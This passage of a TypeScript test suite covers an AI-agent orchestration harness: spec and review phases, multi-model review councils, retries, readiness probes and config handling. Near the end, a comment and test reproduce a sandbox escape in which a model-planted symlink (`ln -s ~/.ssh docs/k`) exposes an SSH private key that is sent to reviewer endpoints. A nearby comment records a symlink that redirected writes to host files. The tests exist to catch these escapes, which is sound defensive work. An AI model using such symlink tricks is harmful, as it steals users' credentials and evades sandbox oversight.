      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 's4', specPath: '.ai/specs/feat.md', files: [] }),
        'utf8',
      );
      return null;
    });
    for (const id of ['fix-2', 'fix-3', 'fix-final']) {
      h.agentBehavior.set(id, (req) => {
        writeFileSync(
          req.resultPath,
          JSON.stringify({ changedPaths: ['src/a.ts'], summary: `${id} applied` }),
          'utf8',
        );
        return null;
      });
    }

    const error = await runHarnessDriver(
      h.host,
      { ...input, workflow: HARNESS_IMPLEMENT_FEATURE, roles },
      h.deps,
    );

    expect(error).toBeNull();
    expect(h.calls.filter((c) => c.id.startsWith('spec-review'))).toHaveLength(3);
    expect(h.calls.map((c) => c.id)).toContain('spec-4');
    expect(h.calls.map((c) => c.id)).toContain('implement');
    expect(
      h.calls.filter((c) => c.kind === 'agent' && /^review(?:-\d+)?$/.test(c.id)),
    ).toHaveLength(3);
    expect(h.calls.map((c) => c.id)).toContain('fix-final');
    expect(h.calls.find((c) => c.id === 'fix-final')?.skill).toBe('om-implement-spec');
    expect(h.calls.map((c) => c.id)).toContain('stage');
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.outcome.status).toBe('contested');
    expect(ledger?.decisions).toContainEqual(
      expect.objectContaining({ kind: 'spec.closing-fixes', detail: 'round:3' }),
    );
  });

  it('does not retry a timeout on the session path — a spent budget is not bought twice', async () => {
    const h = makeHarness(dir);
    let attempts = 0;
    h.agentBehavior.set('review', () => {
      attempts += 1;
      return 'claude timed out after 30m and was killed';
    });

    await runHarnessDriver(h.host, threeReviewerInput, h.deps);

    expect(attempts).toBe(1);
  });

  /**
   * Regression (run a6978de6, 2026-07-28): the spec session obeyed the
   * om-spec-writing Open Questions gate, ended BOTH attempts by asking the
   * user four design questions — in a session nobody reads live — and the run
   * died as "produced no valid result after a retry". The phase contract now
   * outranks the gate: it forbids asking outright and gives the gate a legal
   * outlet (answer yourself, record the assumption, list it in the result).
   */
  it('tells every phase session it is non-interactive and must not ask', async () => {
    const h = makeHarness(dir);
    let specPrompt = '';
    let specReviewPrompt = '';
    h.agentBehavior.set('spec', (req) => {
      specPrompt = req.prompt;
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 's', specPath: '.ai/specs/f.md', files: ['.ai/specs/f.md'] }),
        'utf8',
      );
      writeFileSync(join(dir, '.ai', 'specs', 'f.md'), '# spec\n', 'utf8');
      return null;
    });
    h.agentBehavior.set('spec-review', (req) => {
      specReviewPrompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      return null;
    });
    h.agentBehavior.set('review', (req) => {
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      return null;
    });
    mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
    const error = await runHarnessDriver(h.host, { ...input, workflow: HARNESS_IMPLEMENT_FEATURE }, h.deps);
    expect(error).toBeNull();
    expect(specPrompt).toContain('NON-INTERACTIVE');
    expect(specPrompt).toContain('never emit CEZ:ASK');
    expect(specPrompt).toContain('record each question and the assumption');
    for (const prompt of [specPrompt, specReviewPrompt]) {
      expect(prompt).toContain(`Active repository root: ${dir}`);
      expect(prompt).toContain('Use repo-relative paths from this directory');
      expect(prompt).toContain('never derive a sibling path or append "-harness"');
      expect(prompt).toContain('already injected in your system instructions');
      expect(prompt).toContain('do not invoke the Skill tool or read a SKILL.md file');
    }
  });

  it('guard: carries the spec author\'s recorded assumptions to the run log and the reviewer', async () => {
    const h = makeHarness(dir);
    let reviewPrompt = '';
    h.agentBehavior.set('spec', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({
          summary: 's',
          specPath: '.ai/specs/f.md',
          files: ['.ai/specs/f.md'],
          openQuestions: ['Unified tabs or separate inboxes? — assumed: unified tabs'],
        }),
        'utf8',
      );
      writeFileSync(join(dir, '.ai', 'specs', 'f.md'), '# spec\n', 'utf8');
      return null;
    });
    h.agentBehavior.set('review', (req) => {
      reviewPrompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ verdict: 'approve', findings: [] }), 'utf8');
      return null;
    });
    mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
    const error = await runHarnessDriver(h.host, { ...input, workflow: HARNESS_IMPLEMENT_FEATURE }, h.deps);
    expect(error).toBeNull();
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('proceeded under 1 recorded assumption'))).toBe(true);
    expect(reviewPrompt).toContain('known-open design questions');
    expect(reviewPrompt).toContain('assumed: unified tabs');
  });

  /* ---- spec placement (2026-07-25) ---- */

  /**
   * Regression: a feature run spent a full spec-review round, then died with a
   * raw `ENOENT … /worktrees/<id>/.ai/specs/<spec>.md` from inside the advisor
   * council. The spec phase had written a real file to the MAIN checkout —
   * cezar worktrees nest inside the checkout and carry `.git` as a file, so
   * root detection that looks for a `.git` directory walks past the worktree.
   */
  it('fails before the council when the spec landed in the main checkout, not the worktree', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    const parent = mkdtempSync(join(tmpdir(), 'cez-parent-'));
    h.host.repoRoot = parent; // worktree (cwd) and checkout (repoRoot) now differ, as in a real run
    mkdirSync(join(parent, '.ai', 'specs'), { recursive: true });
    writeFileSync(join(parent, '.ai', 'specs', 'stray.md'), '# spec\n', 'utf8');
    h.agentBehavior.set('spec', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 's', specPath: '.ai/specs/stray.md', files: ['.ai/specs/stray.md'] }),
        'utf8',
      );
      return null;
    });

    const error = await runHarnessDriver(h.host, { ...advisorInput, workflow: HARNESS_IMPLEMENT_FEATURE }, h.deps);

    expect(error).toContain('main checkout');
    expect(error).toContain('.ai/specs/stray.md');
    expect(h.ops.map((o) => o.id)).not.toContain('review');
    expect(h.calls.map((c) => c.id)).not.toContain('spec-review');
    rmSync(parent, { recursive: true, force: true });
  });

  it('fails with a plain message when the reported spec exists nowhere', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    h.agentBehavior.set('spec', (req) => {
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 's', specPath: '.ai/specs/ghost.md', files: [] }),
        'utf8',
      );
      return null;
    });

    const error = await runHarnessDriver(h.host, { ...advisorInput, workflow: HARNESS_IMPLEMENT_FEATURE }, h.deps);

    expect(error).toContain('no such file exists in the run worktree');
    expect(h.ops.map((o) => o.id)).not.toContain('review');
  });

  // the spec path was rejected only after the phase completed, so every resume reused it.
  it('retries the spec phase once, naming the rejected spec path', async () => {
    const h = makeHarness(dir);
    const specPrompts: string[] = [];
    h.agentBehavior.set('spec', (req) => {
      specPrompts.push(req.prompt);
      const specPath = specPrompts.length === 1 ? '.ai/specs/ghost.md' : '.ai/specs/f.md';
      if (specPrompts.length > 1) {
        mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
        writeFileSync(join(dir, specPath), '# spec\n', 'utf8');
      }
      writeFileSync(req.resultPath, JSON.stringify({ summary: 's', specPath, files: [specPath] }), 'utf8');
      return null;
    });

    const error = await runHarnessDriver(h.host, { ...input, workflow: HARNESS_IMPLEMENT_FEATURE }, h.deps);

    expect(error).toBeNull();
    expect(specPrompts).toHaveLength(2);
    expect(specPrompts[1]).toContain('RESULT-CONTRACT RETRY');
    expect(specPrompts[1]).toContain('no such file exists in the run worktree');
  });

  it('re-runs a completed spec phase on resume when its spec file is no longer valid', async () => {
    let cancelled = false;
    let specCalls = 0;
    const entry = () => {
      const h = makeHarness(dir);
      h.host.isCancelled = () => cancelled;
      h.agentBehavior.set('spec', (req) => {
        specCalls += 1;
        mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
        writeFileSync(join(dir, '.ai', 'specs', 'f.md'), '# spec\n', 'utf8');
        writeFileSync(
          req.resultPath,
          JSON.stringify({ summary: 's', specPath: '.ai/specs/f.md', files: ['.ai/specs/f.md'] }),
          'utf8',
        );
        return null;
      });
      return h;
    };
    const first = entry();
    first.agentBehavior.set('spec-review', () => {
      cancelled = true;
      return null;
    });
    const feature = { ...input, workflow: HARNESS_IMPLEMENT_FEATURE };
    expect(await runHarnessDriver(first.host, feature, first.deps)).toBeNull();
    rmSync(join(dir, '.ai', 'specs', 'f.md'));

    cancelled = false;
    const resumed = entry();
    expect(await runHarnessDriver(resumed.host, feature, resumed.deps)).toBeNull();

    expect(specCalls).toBe(2);
    expect(loadLedger(resumed.host.dataDir, resumed.host.runId)?.stage.status).toBe('staged');
  });

  /* ---- readiness probing (2026-07-25) ---- */

  it('fails preflight with the upstream error when a bound model is unreachable', async () => {
    const h = makeHarness(dir);
    h.probeVerdicts.set('codex/gpt-5.5-mini', {
      status: 'failed',
      detail: 'POST /session/:id/message → 500 no such column: replacement_seq',
    });
    const unreachable = {
      ...input,
      roles: {
        ...roles,
        reviewers: [
          { runner: 'claude' as const, model: 'opus' },
          { runner: 'codex' as const, model: 'gpt-5.5-mini' },
        ],
      },
    };

    const error = await runHarnessDriver(h.host, unreachable, h.deps);

    expect(error).toContain('codex/gpt-5.5-mini');
    expect(error).toContain('replacement_seq');
    expect(h.calls.map((c) => c.id)).not.toContain('qualify');
    expect(h.calls.map((c) => c.id)).not.toContain('stage');
  });

  /**
   * Stage-only is a property of SESSIONS, so the refusal follows the session, not
   * the vendor. The orchestrator and the implementer write to the worktree and
   * cezar has no seam to hold an OpenCode session to stage-only; a reviewer with
   * a gateway prefix opens no session at all — `synthesizeReviewerBinding` turns
   * it into one structured Zen call, which is the transport that module exists
   * for. The refusal used to cover all three, which blocked exactly the
   * reviewers the picker offers.
   */
  it('rejects an OpenCode implementer before any paid harness phase — that role is a session', async () => {
    const h = makeHarness(dir);
    const unsafe = {
      ...input,
      roles: { ...roles, implementer: { runner: 'opencode' as const, model: 'opencode/gpt-5.6-luna' } },
    };

    const error = await runHarnessDriver(h.host, unsafe, h.deps);

    expect(error).toMatch(/stage-only isolation for the implementer/i);
    expect(h.calls.map((call) => call.id)).not.toContain('qualify');
  });

  it('rejects an OpenCode reviewer that names no gateway, because nothing can route it', async () => {
    const h = makeHarness(dir);
    const unsafe = {
      ...input,
      roles: {
        ...roles,
        reviewers: [
          { runner: 'claude' as const, model: 'opus' },
          { runner: 'opencode' as const, model: 'mimo-v2.5-free' },
        ],
      },
    };

    const error = await runHarnessDriver(h.host, unsafe, h.deps);

    expect(error).toMatch(/no structured review path/i);
    expect(h.calls.map((call) => call.id)).not.toContain('qualify');
  });

  /**
   * `validateConfig` in harness.mjs demands `agentHarness.version === 1` and
   * `delivery.mode === 'stage-only'` before it will run a council. The driver
   * synthesizes the council config from scratch when the repo has none — the
   * ordinary cezar project — and used to supply neither, so the first round of
   * every zero-config council died on "agentHarness.version must be 1". The
   * 2026-08-06 eval hit this exact shape and read it as a lineup problem.
   */
  it('states the runtime invariants in the synthesized council config, so a repo with no config still gets a council', async () => {
    const h = makeHarness(dir);
    const seated = {
      ...input,
      roles: {
        ...roles,
        reviewers: [
          { runner: 'claude' as const, model: 'opus' },
          { runner: 'opencode' as const, model: 'opencode/muse-spark-1.2-contributor-free' },
        ],
      },
    };

    await runHarnessDriver(h.host, seated, h.deps);

    // `ops`, not `calls`: an agent phase can share the name, and only the runtime op
    // carries the argv the council config path lives in.
    const review = h.ops.find((call) => call.kind === 'op' && call.id === 'review' && call.args);
    expect(review).toBeDefined();
    const args = review!.args!;
    const configPath = args[args.indexOf('--config') + 1]!;
    const cfg = JSON.parse(readFileSync(configPath, 'utf8')) as {
      agentHarness?: { version?: unknown; delivery?: { mode?: unknown } };
    };
    expect(cfg.agentHarness?.version).toBe(1);
    expect(cfg.agentHarness?.delivery?.mode).toBe('stage-only');
  });

  it('seats an OpenCode reviewer that does name one, and conducts the run', async () => {
    const h = makeHarness(dir);
    const seated = {
      ...input,
      roles: {
        ...roles,
        reviewers: [
          { runner: 'claude' as const, model: 'opus' },
          { runner: 'opencode' as const, model: 'opencode/mimo-v2.5-free' },
        ],
      },
    };

    const error = await runHarnessDriver(h.host, seated, h.deps);

    expect(typeof error === 'string' ? error : '').not.toMatch(/stage-only|structured review path/i);
    expect(h.calls.map((call) => call.id)).toContain('qualify');
  });

  it('records the probe verdict per model in the ledger instead of assuming ready', async () => {
    const h = makeHarness(dir);
    h.probeVerdicts.set('codex/gpt-5.6-sol', { status: 'ready', detail: 'round-trip ok via codex exec' });
    await runHarnessDriver(h.host, { ...input, roles }, h.deps);

    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    const codex = ledger?.models.find((m) => m.id === 'codex/gpt-5.6-sol');
    expect(codex?.readiness).toBe('ready');
    expect(codex?.readinessDetail).toContain('round-trip');
  });

  /* ---- advisor reviewers (spec 2026-07-23-harness-orchestration) ---- */

  const advisorRoles = {
    ...roles,
    reviewers: [
      { runner: 'claude' as const, model: 'opus' },
      { runner: 'harness' as const, model: 'kimi', family: 'moonshot' },
    ],
  };
  const advisorInput = { ...input, roles: advisorRoles };

  function bindKimi(h: ReturnType<typeof makeHarness>) {
    const agentHarness = {
      models: { kimi: { roles: ['reviewer'], family: 'moonshot', timeoutMs: 120_000 } },
      profiles: {},
    };
    mkdirSync(join(dir, '.ai'), { recursive: true });
    writeFileSync(join(dir, '.ai', 'agentic.config.json'), JSON.stringify({ agentHarness }), 'utf8');
    h.deps.loadAgentic = async () => ({ baseBranch: 'main', validationCommands: ['echo ok'], agentHarness });
  }

  it('isolates the advisor council from unused legacy models and profiles', async () => {
    const h = makeHarness(dir);
    const agentHarness = {
      models: {
        kimi: { adapter: 'preset', preset: 'kimi-subscription', model: 'kimi-code/k3', roles: ['reviewer'], family: 'moonshot' },
        retired: { roles: ['worker'], family: 'openai' },
      },
      profiles: { retired: { workers: ['retired'], concurrency: { reviewers: 1 } } },
    };
    mkdirSync(join(dir, '.ai'), { recursive: true });
    writeFileSync(join(dir, '.ai', 'agentic.config.json'), JSON.stringify({ agentHarness }));
    h.deps.loadAgentic = async () => ({ baseBranch: 'main', validationCommands: ['echo ok'], agentHarness });
    expect(await runHarnessDriver(h.host, advisorInput, h.deps)).toBeNull();
    const review = h.ops.find((op) => op.id === 'review')!;
    const configPath = review.args![review.args!.indexOf('--config') + 1]!;
    const runtime = new URL('../../vendor/skills/cez-harness/scripts/harness.mjs', import.meta.url).pathname;
    const result = execFileSync(process.execPath, [runtime, 'validate-config', '--config', configPath], {
      encoding: 'utf8', timeout: 10_000,
    });
    expect(JSON.parse(result)).toMatchObject({ status: 'valid', models: ['kimi'], profiles: ['cez-role-council'] });
  });

  /**
   * Regression (user report 2026-07-28): configure models in the cockpit, start
   * a multi-model run, and the run died on its first step with
   * "agentHarness exists only in the repo working tree, but its config is not a
   * clean staged change; stage .ai/agentic.config.json ... or commit it".
   *
   * The user had touched nothing by hand — cezar's own setup wrote the file,
   * twice, leaving it `MM` (staged, then edited again), which is precisely what
   * the check rejected. The index state was never the security boundary; where
   * the config is READ from is, and that is the user's checkout either way.
   */
  it('starts from a dirty working-copy model config instead of demanding git staging', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    const checkout = mkdtempSync(join(tmpdir(), 'cez-checkout-'));
    h.host.repoRoot = checkout; // worktree (cwd) ≠ checkout, as in a real run
    const git = (...args: string[]) =>
      execFileSync('git', args, { cwd: checkout, stdio: 'ignore' });
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'test@local');
    git('config', 'user.name', 'test');
    mkdirSync(join(checkout, '.ai'), { recursive: true });
    const configPath = join(checkout, '.ai', 'agentic.config.json');
    const agentHarness = {
      models: { kimi: { roles: ['reviewer'], family: 'moonshot', timeoutMs: 120_000 } },
      profiles: {},
    };
    writeFileSync(configPath, JSON.stringify({ validation: { commands: ['echo ok'] } }), 'utf8')
    git('add', '.ai/agentic.config.json')
    git('commit', '-q', '-m', 'base')
    writeFileSync(configPath, JSON.stringify({ agentHarness }), 'utf8')
    git('add', '.ai/agentic.config.json')
    writeFileSync(configPath, JSON.stringify({ agentHarness, touchedAgain: true }), 'utf8')
    expect(
      execFileSync('git', ['status', '--porcelain=v1', '--', '.ai/agentic.config.json'], {
        cwd: checkout,
        encoding: 'utf8',
      }).trim(),
    ).toMatch(/^MM/)

    h.deps.loadAgentic = async (root: string) => ({
      baseBranch: 'main',
      validationCommands: ['echo ok'],
      agentHarness: root === checkout ? agentHarness : undefined,
    })

    const error = await runHarnessDriver(h.host, advisorInput, h.deps)

    expect(error).toBeNull()
    expect(String(error)).not.toMatch(/clean staged change/)
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message))
    expect(notes.some((n) => n.includes('working copy of .ai/agentic.config.json'))).toBe(true)
    expect(notes.some((n) => /stage .ai\/agentic.config.json/.test(n))).toBe(false)
    rmSync(checkout, { recursive: true, force: true })
  })

  /**
   * Regression (run 0fe16fb7, 2026-07-28): a haiku reviewer produced a complete
   * review — three blockers, seven majors — wrapped in a markdown summary
   * instead of bare result JSON, twice, and both attempts were discarded as
   * "ended without a valid result file". When the contract object is present
   * inside the prose, it is salvaged (schema-validated as always) and the
   * framing slip is noted instead of billed as a failure.
   */
  it('salvages a review whose JSON the model wrapped in prose', async () => {
    const h = makeHarness(dir);
    h.agentBehavior.set('review', (req) => {
      writeFileSync(
        req.resultPath,
        [
          '## Summary',
          '',
          "I've completed a comprehensive review. Here is the result:",
          '',
          '```json',
          JSON.stringify({ verdict: 'approve', findings: [{ severity: 'minor', title: 'nit about naming' }] }),
          '```',
          '',
          'Let me know if anything needs a closer look.',
        ].join('\n'),
        'utf8',
      );
      return null;
    });
    const error = await runHarnessDriver(h.host, input, h.deps);
    expect(error).toBeNull();
    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    expect(ledger?.stage.status).toBe('staged');
  });

  /**
   * Regression (run 5f6fe8ae, 2026-07-28): one write landing inside the council
   * window — there, cezar's own diff poller — "changed" the subject, every
   * reviewer was rejected, quorum failed, and the run DIED on its first council.
   * The subject hash is representation-invariant now, so the poller specifically
   * can no longer trigger this; for changes that are real, the council retries
   * once against the current subject before giving up.
   */
  // the council wrote `.ai/qa/cez-council-*` inside the worktree, unsandboxed and
  // following links, so a model-planted symlink there redirected the write to a host file.
  // the runtime's default 3 attempts with escalating timeouts outlasted the op's
  // own timeout, so one slow advisor got the op killed and every completed sibling recorded failed.
  it('leaves advisor retries to cezar: the synthesized council runs each reviewer once', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    expect(await runHarnessDriver(h.host, advisorInput, h.deps)).toBeNull();
    const review = h.ops.find((op) => op.id === 'review')!;
    const config = JSON.parse(readFileSync(review.args![review.args!.indexOf('--config') + 1]!, 'utf8')) as {
      agentHarness: { profiles: Record<string, { retry?: unknown }> };
    };
    expect(config.agentHarness.profiles['cez-role-council']?.retry).toEqual({ maxAttempts: 1 });
  });

  it('gives the advisor council an output dir under the run artifacts, never the worktree', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    expect(await runHarnessDriver(h.host, advisorInput, h.deps)).toBeNull();
    const review = h.ops.find((op) => op.id === 'review')!;
    const outputDir = review.args![review.args!.indexOf('--output-dir') + 1]!;
    expect(outputDir.startsWith(harnessArtifactDir(h.host.dataDir, h.host.runId) + sep)).toBe(true);
    expect(outputDir).not.toContain(join('.ai', 'qa'));
  });

  it('retries the advisor council once when the subject changed mid-council', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    let subject = 'stable-review-subject';
    h.deps.snapshotReviewSubject = async () => subject;
    scriptCouncil(h, (round) => {
      if (round === 1) subject = 'changed-during-council';
      return {
        ok: true,
        result: {
          verdict: 'approve',
          reviewers: [{ id: 'kimi', status: 'completed', review: { verdict: 'approve', findings: [], notes: [] } }],
        },
      };
    });
    const error = await runHarnessDriver(h.host, advisorInput, h.deps);
    expect(h.ops.filter((o) => o.id === 'review')).toHaveLength(2);
    const notes = h.events.filter((e) => e.type === 'note').map((e) => String(e.message));
    expect(notes.some((n) => n.includes('retrying the council once against the current subject'))).toBe(true);
    // A change that outlives the council voids the round: staging it would hand over a subject the
    // gate never validated and part of the council never saw.
    expect(error).toMatch(/review subject changed during the council, so this round is void/);
    expect(loadLedger(h.host.dataDir, h.host.runId)?.stage.status).not.toBe('staged');

    // Continue re-validates and re-reviews the subject as it now stands.
    const validated: string[] = [];
    h.deps.validate = async (commands) => {
      validated.push(subject);
      return commands.map((command) => ({ command, status: 'passed' as const, exitCode: 0, evidence: 'ok' }));
    };
    expect(await runHarnessDriver(h.host, advisorInput, h.deps)).toBeNull();
    expect(validated).toContain('changed-during-council');
    expect(loadLedger(h.host.dataDir, h.host.runId)?.stage.status).toBe('staged');
  });

  function scriptCouncil(
    h: ReturnType<typeof makeHarness>,
    onReview: (round: number) => { ok: boolean; stderr?: string; result?: unknown },
  ) {
    let reviewRounds = 0;
    h.deps.createRuntime = () => ({
      run: async (op: string, args: string[]) => {
        h.ops.push({ kind: 'op', id: op, args });
        h.calls.push({ kind: 'op', id: op, args });
        if (op === 'capture') {
          writeFileSync(join(harnessArtifactDir(h.host.dataDir, h.host.runId), 'start-state.json'), '{"refs":{}}', 'utf8');
        }
        if (op === 'stage') {
          const output = args[args.indexOf('--output') + 1];
          const pathsFile = args[args.indexOf('--paths-file') + 1];
          if (output) {
            writeFileSync(
              output,
              JSON.stringify({
                status: 'ready',
                stagedPaths: pathsFile
                  ? readFileSync(pathsFile, 'utf8').split(/\r?\n/).filter(Boolean)
                  : [],
              }),
              'utf8',
            );
          }
        }
        if (op === 'review') {
          reviewRounds += 1;
          const outputDir = args[args.indexOf('--output-dir') + 1]!;
          const { ok, stderr = '', result } = onReview(reviewRounds);
          if (result !== undefined) {
            mkdirSync(outputDir, { recursive: true });
            writeFileSync(join(outputDir, 'review-result.json'), JSON.stringify(result), 'utf8');
          }
          return { ok, exitCode: ok ? 0 : 2, stdout: '{}', stderr, durationMs: 5 };
        }
        return { ok: true, exitCode: 0, stdout: '{}', stderr: '', durationMs: 5 };
      },
      kill: () => undefined,
    });
  }

  // the leaf check followed a symlinked DIRECTORY, so the unsandboxed runtime read a
  // file the sandbox denies (`ln -s ~/.ssh docs/k`) and sent it to the reviewer endpoints.
  it.skipIf(process.platform === 'win32')('refuses a spec reported through a symlinked directory', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    const outside = join(dir, '..', `outside-${basename(dir)}`);
    mkdirSync(outside, { recursive: true });
    writeFileSync(join(outside, 'id_ed25519'), 'PRIVATE KEY\n', 'utf8');
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, 'docs'), { recursive: true });
      if (!existsSync(join(dir, 'docs', 'k'))) symlinkSync(outside, join(dir, 'docs', 'k'));
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'spec', specPath: 'docs/k/id_ed25519', files: ['docs/k/id_ed25519'] }),
        'utf8',
      );
      return null;
    });
    try {
      const error = await runHarnessDriver(h.host, { ...advisorInput, workflow: HARNESS_IMPLEMENT_FEATURE }, h.deps);
      expect(error).toMatch(/symlinked directory/);
      expect(h.ops.some((op) => op.id === 'review')).toBe(false);
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  });

  it('hands the spec council runtime a copy of the verified spec, not a worktree path', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
      writeFileSync(join(dir, '.ai', 'specs', 'feat.md'), '# feat\n', 'utf8');
      writeFileSync(
        req.resultPath,
        JSON.stringify({ summary: 'spec', specPath: '.ai/specs/feat.md', files: ['.ai/specs/feat.md'] }),
        'utf8',
      );
      return null;
    });
    await runHarnessDriver(h.host, { ...advisorInput, workflow: HARNESS_IMPLEMENT_FEATURE }, h.deps);
    const review = h.ops.find((op) => op.id === 'review' && op.args?.includes('--artifact'))!;
    const artifact = review.args![review.args!.indexOf('--artifact') + 1]!;
    expect(artifact.startsWith(harnessArtifactDir(h.host.dataDir, h.host.runId) + sep)).toBe(true);
    expect(readFileSync(artifact, 'utf8')).toBe('# feat\n');
  });

  it('adopts a subject-rejected spec council in the retry when its contract names the current spec', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    let subject = 'stable-review-subject';
    let councilCalls = 0;
    h.deps.snapshotReviewSubject = async () => subject;
    h.agentBehavior.set('spec', (req) => {
      mkdirSync(join(dir, '.ai', 'specs'), { recursive: true });
      writeFileSync(join(dir, '.ai', 'specs', 'feat.md'), '# feat\n', 'utf8');
      writeFileSync(
        req.resultPath,
        JSON.stringify({
          summary: 'feature spec',
          specPath: '.ai/specs/feat.md',
          files: ['.ai/specs/feat.md'],
        }),
        'utf8',
      );
      return null;
    });
    scriptCouncil(h, () => {
      councilCalls += 1;
      subject = `changed-${councilCalls}`;
      return {
        ok: true,
        result: {
          verdict: 'approve',
          reviewContract: {
            subjectSha256: createHash('sha256').update('# feat\n').digest('hex'),
          },
          reviewers: [
            {
              id: 'kimi',
              status: 'completed',
              review: { verdict: 'approve', findings: [] },
            },
          ],
        },
      };
    });
    const featureInput = { ...advisorInput, workflow: HARNESS_IMPLEMENT_FEATURE };

    const error = await runHarnessDriver(h.host, featureInput, h.deps);

    // The SPEC council reviews a pinned artifact, so its input hash survives the
    // worktree churn: the retry finds the round-1 result, checks its contract
    // still names the spec on disk, and adopts it — one paid call, no rerun.
    expect(
      loadLedger(h.host.dataDir, h.host.runId)?.invocations.find((invocation) =>
        invocation.id.startsWith('advisor:spec:1:'),
      ),
    ).toMatchObject({ status: 'completed', artifactSha256: expect.any(String) });
    expect(
      h.events.some(
        (event) =>
          event.type === 'note' && String(event.message).includes('no model rerun was needed'),
      ),
    ).toBe(true);

    expect(error).toMatch(/review subject changed/i);
    expect(councilCalls).toBe(3); // spec ×1 (adopted in retry), impl ×2 (attempt + retry)
  });

  /**
   * Regression (2026-07-25, live failure): a council completed with two
   * reviewers and six findings, and cezar discarded the whole thing as
   * "advisor council failed: no structured result" — because `location` was
   * declared `z.string()` here while the runtime's OWN published contract
   * (cez-harness/references/review-result.schema.json) emits an object:
   *   "location": { "type": "object", "required": ["path","line","symbol"] }
   * Any advisor finding carrying a location failed the parse. Deterministic.
   * The payload below is the real shape, copied from that run's artifact.
   */
  it('accepts the runtime contract’s object-shaped finding location and normalises it', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    scriptCouncil(h, () => ({
      ok: true,
      result: {
        verdict: 'request_changes',
        reviewers: [
          {
            id: 'kimi',
            status: 'completed',
            review: {
              verdict: 'request_changes',
              findings: [
                {
                  fingerprint: 'abc123',
                  severity: 'major',
                  category: 'security',
                  title: 'fail-open authorization',
                  location: { path: 'src/api/proposals.ts', line: 42, symbol: 'handler' },
                  evidence: 'no reader-level check',
                  impact: 'x',
                  remediation: 'y',
                  confidence: 0.9,
                },
                // line/symbol null is the common case for a spec review —
                // it must collapse to the bare path, not "path:null".
                {
                  severity: 'major',
                  title: 'missing i18n keys',
                  location: { path: '.ai/specs/feat.md', line: null, symbol: null },
                  evidence: 'new copy is hardcoded',
                },
              ],
            },
          },
        ],
      },
    }));
    let fixPrompt = '';
    h.agentBehavior.set('fix-2', (req) => {
      fixPrompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.ts'] }), 'utf8');
      return null;
    });

    const error = await runHarnessDriver(h.host, advisorInput, h.deps);

    expect(error).not.toMatch(/no structured result/);
    expect(fixPrompt).toContain('src/api/proposals.ts:42 (handler)');
    expect(fixPrompt).toContain('.ai/specs/feat.md');
    expect(fixPrompt).not.toContain('[object Object]');
    expect(fixPrompt).not.toMatch(/feat\.md:null/); // a null line is absent, not printed
  });

  it('runs advisor reviewers as one council op over a synthesized profile and folds the result in', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    scriptCouncil(h, () => ({
      ok: true,
      result: {
        verdict: 'approve',
        reviewers: [
          { id: 'kimi', family: 'moonshot', status: 'completed', review: { verdict: 'approve', findings: [{ severity: 'minor', title: 'naming nit' }] } },
        ],
      },
    }));
    const error = await runHarnessDriver(h.host, advisorInput, h.deps);
    expect(error).toBeNull();

    const review = h.ops.find((o) => o.id === 'review');
    expect(review?.args).toContain('--profile');
    expect(review!.args![review!.args!.indexOf('--profile') + 1]).toBe('cez-role-council');
    const configPath = review!.args![review!.args!.indexOf('--config') + 1]!;
    const synthesized = JSON.parse(readFileSync(configPath, 'utf8')) as {
      agentHarness: { profiles: Record<string, { reviewers: string[]; reviewPolicy: { requiredReviewers: string[] } }> };
    };
    expect(synthesized.agentHarness.profiles['cez-role-council']).toMatchObject({
      reviewers: ['kimi'],
      reviewPolicy: { mode: 'all-required', requiredReviewers: ['kimi'] },
    });

    const ledger = loadLedger(h.host.dataDir, h.host.runId);
    const council = ledger?.councils[0] as { reviewers?: Array<Record<string, unknown>> };
    const kimiRow = council?.reviewers?.find((r) => r.id === 'harness/kimi');
    expect(kimiRow).toMatchObject({ runner: 'harness', family: 'moonshot', status: 'completed', verdict: 'approve' });
    expect(h.calls.map((c) => c.id)).toContain('stage');
  });

  it('an advisor request_changes drives the fix round with attributed findings', async () => {
    const h = makeHarness(dir);
    bindKimi(h);
    scriptCouncil(h, (round) => ({
      ok: true,
      result:
        round === 1
          ? {
              verdict: 'request_changes',
              reviewers: [
                { id: 'kimi', family: 'moonshot', status: 'completed', review: { verdict: 'request_changes', findings: [{ severity: 'blocker', title: 'k3 spotted a race' }] } },
              ],
            }
          : {
              verdict: 'approve',
              reviewers: [{ id: 'kimi', family: 'moonshot', status: 'completed', review: { verdict: 'approve', findings: [] } }],
            },
    }));
    let fixPrompt = '';
    h.agentBehavior.set('fix-2', (req) => {
      fixPrompt = req.prompt;
      writeFileSync(req.resultPath, JSON.stringify({ changedPaths: ['src/a.ts'] }), 'utf8');
      return null;
